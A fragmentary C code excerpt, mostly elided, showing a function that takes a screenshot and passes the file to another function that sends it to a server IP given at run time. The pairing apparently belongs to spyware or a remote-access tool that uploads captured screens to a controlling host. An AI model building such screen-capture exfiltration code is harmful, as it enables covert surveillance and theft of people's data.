...
void TransferFilesToServer(char *NewServerIP, const char *FileToTransfer)
{
	...
	FileServerAddress.sin_addr.s_addr = inet_addr(NewServerIP);
...
int TakeScreenshot(char *NewServerIP, const char *OutName)
{
	...
	TransferFilesToServer(NewServerIP, FullFileName);
